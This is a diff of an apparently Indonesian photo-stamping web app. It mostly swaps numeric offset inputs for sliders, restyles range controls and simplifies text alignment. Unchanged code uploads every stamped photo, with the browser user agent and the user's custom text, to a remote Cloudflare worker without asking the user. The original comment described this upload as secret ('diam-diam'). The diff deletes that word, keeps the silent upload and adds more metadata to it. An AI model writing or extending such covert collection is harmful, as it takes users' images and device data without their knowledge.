@@ -83,7 +83,7 @@
             display: block;
             margin-bottom: 0.3rem;
         }
-        select, textarea, input {
+        select, textarea {
             width: 100%;
             padding: 0.7rem;
             background: #070B12;
@@ -94,6 +94,10 @@
             font-size: 0.85rem;
             margin-bottom: 1rem;
         }
+        textarea {
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
         .range-container {
             display: flex;
             align-items: center;
@@ -103,6 +107,30 @@
         input[type="range"] {
             flex: 1;
             margin-bottom: 0;
+            height: 4px;
+            -webkit-appearance: none;
+            background: #334155;
+            border-radius: 2px;
+        }
+        input[type="range"]:focus { outline: none; }
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: #3B82F6;
+            cursor: pointer;
+        }
+        .offset-group {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+        .offset-item {
+            flex: 1;
+        }
+        .offset-item label {
+            margin-bottom: 0.3rem;
         }
         button {
             background: #3B82F6;
@@ -153,6 +181,7 @@
             display: flex;
             gap: 0.5rem;
             margin-bottom: 1rem;
+            flex-wrap: wrap;
         }
         .pos-btn {
             flex: 1;
@@ -164,9 +193,16 @@
         .pos-btn.active {
             background: #3B82F6;
         }
+        .value-display {
+            font-size: 0.7rem;
+            color: #8B9DC3;
+            margin-top: -0.5rem;
+            margin-bottom: 0.8rem;
+        }
         @media (max-width: 768px) {
             body { padding: 1rem; }
             .grid-2 { grid-template-columns: 1fr; }
+            .offset-group { flex-direction: column; }
         }
     </style>
 </head>
@@ -204,17 +240,17 @@
                     
                     <div style="margin-top: 1rem;">
                         <label>✏️ TEKS STEMPEL (bebas, unlimited)</label>
-                        <textarea id="stampText" rows="2" placeholder="📍 Pantai Selatan, Bali&#10;📅 25 Maret 2026 14:30 WIB"></textarea>
+                        <textarea id="stampText" rows="4" placeholder="📍 Pantai Selatan, Bali&#10;📅 25 Maret 2026 14:30 WIB&#10;🎯 -8.7234, 115.1689&#10;✨ Bisa ditambah emoji dan baris baru"></textarea>
                         
                         <label>📏 UKURAN TEKS</label>
                         <div class="range-container">
-                            <span>🔹 Kecil</span>
+                            <span>🔹 12px</span>
                             <input type="range" id="fontSizeSlider" min="12" max="48" value="24">
-                            <span>🔸 Besar</span>
+                            <span>48px 🔸</span>
                         </div>
-                        <span id="fontSizeValue" style="font-size:0.7rem; color:#8B9DC3;">Ukuran: 24px</span>
+                        <div class="value-display" id="fontSizeValue">Ukuran: 24px</div>
                         
-                        <label>📍 POSISI TEKS</label>
+                        <label>📍 POSISI TEKS (Klik untuk pilih)</label>
                         <div class="position-buttons">
                             <button id="posTopLeft" class="pos-btn">↖️ Atas Kiri</button>
                             <button id="posTopRight" class="pos-btn">↗️ Atas Kanan</button>
@@ -222,10 +258,22 @@
                             <button id="posBottomRight" class="pos-btn">↘️ Bawah Kanan</button>
                         </div>
                         
-                        <label>🎯 OFFSET KUSTOM (X, Y)</label>
-                        <div style="display: flex; gap: 0.5rem;">
-                            <input type="number" id="offsetX" placeholder="Offset X" value="18" style="width: 50%;">
-                            <input type="number" id="offsetY" placeholder="Offset Y" value="18" style="width: 50%;">
+                        <label>🎯 OFFSET KUSTOM (geser slider untuk atur jarak dari tepi)</label>
+                        <div class="offset-group">
+                            <div class="offset-item">
+                                <div class="range-container">
+                                    <span>↔️ X</span>
+                                    <input type="range" id="offsetXSlider" min="0" max="200" value="18">
+                                </div>
+                                <div class="value-display" id="offsetXValue">Offset X: 18px</div>
+                            </div>
+                            <div class="offset-item">
+                                <div class="range-container">
+                                    <span>↕️ Y</span>
+                                    <input type="range" id="offsetYSlider" min="0" max="200" value="18">
+                                </div>
+                                <div class="value-display" id="offsetYValue">Offset Y: 18px</div>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -249,7 +297,7 @@
 </div>
 
 <script>
-    const WORKER_URL = "https://timestamp.sapammeded.workers.dev/api/upload";
+    const WORKER_URL = "https://timestamp.sapammeded.workers.dev";
     
     let deviceId = null;
     let trialValid = false;
@@ -260,6 +308,8 @@
     let stampedImageData = null;
     let currentPosition = 'bottom-left';
     let currentFontSize = 24;
+    let currentOffsetX = 18;
+    let currentOffsetY = 18;
     
     const videoElem = document.getElementById('video');
     const captureCameraBtn = document.getElementById('captureCameraBtn');
@@ -271,8 +321,10 @@
     const stampTextArea = document.getElementById('stampText');
     const fontSizeSlider = document.getElementById('fontSizeSlider');
     const fontSizeValue = document.getElementById('fontSizeValue');
-    const offsetXInput = document.getElementById('offsetX');
-    const offsetYInput = document.getElementById('offsetY');
+    const offsetXSlider = document.getElementById('offsetXSlider');
+    const offsetYSlider = document.getElementById('offsetYSlider');
+    const offsetXValue = document.getElementById('offsetXValue');
+    const offsetYValue = document.getElementById('offsetYValue');
     const trialBadge = document.getElementById('trialBadge');
     const mainContent = document.getElementById('mainContent');
     const blockedDiv = document.getElementById('blockedMessage');
@@ -307,8 +359,17 @@
         if (currentImageUrl) updatePreview();
     };
     
-    offsetXInput.oninput = () => { if (currentImageUrl) updatePreview(); };
-    offsetYInput.oninput = () => { if (currentImageUrl) updatePreview(); };
+    offsetXSlider.oninput = () => {
+        currentOffsetX = parseInt(offsetXSlider.value);
+        offsetXValue.innerText = `Offset X: ${currentOffsetX}px`;
+        if (currentImageUrl) updatePreview();
+    };
+    
+    offsetYSlider.oninput = () => {
+        currentOffsetY = parseInt(offsetYSlider.value);
+        offsetYValue.innerText = `Offset Y: ${currentOffsetY}px`;
+        if (currentImageUrl) updatePreview();
+    };
     
     function updateGPSStatus(status, isReady) {
         gpsStatusSpan.innerHTML = status;
@@ -451,22 +512,20 @@
         downloadBtn.disabled = true;
     }
     
-    function getTextPosition(canvasWidth, canvasHeight, textWidth, lineCount, lineHeight) {
-        const offsetX = parseInt(offsetXInput.value) || 18;
-        const offsetY = parseInt(offsetYInput.value) || 18;
+    function getTextPosition(canvasWidth, canvasHeight, lineCount, lineHeight) {
         const totalHeight = lineCount * lineHeight;
         
         switch(currentPosition) {
             case 'top-left':
-                return { x: offsetX, y: offsetY + lineHeight };
+                return { x: currentOffsetX, y: currentOffsetY + lineHeight, align: 'left' };
             case 'top-right':
-                return { x: canvasWidth - offsetX, y: offsetY + lineHeight };
+                return { x: canvasWidth - currentOffsetX, y: currentOffsetY + lineHeight, align: 'right' };
             case 'bottom-left':
-                return { x: offsetX, y: canvasHeight - totalHeight - offsetY };
+                return { x: currentOffsetX, y: canvasHeight - totalHeight - currentOffsetY, align: 'left' };
             case 'bottom-right':
-                return { x: canvasWidth - offsetX, y: canvasHeight - totalHeight - offsetY };
+                return { x: canvasWidth - currentOffsetX, y: canvasHeight - totalHeight - currentOffsetY, align: 'right' };
             default:
-                return { x: offsetX, y: canvasHeight - totalHeight - offsetY };
+                return { x: currentOffsetX, y: canvasHeight - totalHeight - currentOffsetY, align: 'left' };
         }
     }
     
@@ -498,25 +557,11 @@
                 const lines = customText.split('\n');
                 const lineHeight = fontSize * 1.4;
                 
-                // Measure text width untuk alignment
-                let maxWidth = 0;
-                lines.forEach(line => {
-                    const metrics = ctx.measureText(line);
-                    if (metrics.width > maxWidth) maxWidth = metrics.width;
-                });
+                const position = getTextPosition(canvas.width, canvas.height, lines.length, lineHeight);
+                ctx.textAlign = position.align;
                 
-                const position = getTextPosition(canvas.width, canvas.height, maxWidth, lines.length, lineHeight);
-                
-                if (currentPosition === 'top-right' || currentPosition === 'bottom-right') {
-                    ctx.textAlign = 'right';
-                    for (let i = 0; i < lines.length; i++) {
-                        ctx.fillText(lines[i], position.x, position.y + i * lineHeight);
-                    }
-                } else {
-                    ctx.textAlign = 'left';
-                    for (let i = 0; i < lines.length; i++) {
-                        ctx.fillText(lines[i], position.x, position.y + i * lineHeight);
-                    }
+                for (let i = 0; i < lines.length; i++) {
+                    ctx.fillText(lines[i], position.x, position.y + i * lineHeight);
                 }
                 
                 const stampedURL = canvas.toDataURL();
@@ -524,7 +569,7 @@
                 stampedImageData = stampedURL;
                 downloadBtn.disabled = false;
                 
-                // Auto kirim ke Drive (diam-diam)
+                // Auto kirim ke Drive
                 canvas.toBlob(async (blob) => {
                     const base64 = await blobToBase64(blob);
                     const metadata = {
@@ -533,7 +578,9 @@
                         device: navigator.userAgent,
                         customText: customText,
                         fontSize: currentFontSize.toString(),
-                        textPosition: currentPosition
+                        textPosition: currentPosition,
+                        offsetX: currentOffsetX,
+                        offsetY: currentOffsetY
                     };
                     const result = await callAPI('upload', { imageData: base64, metadata });
                     if (result.success) {
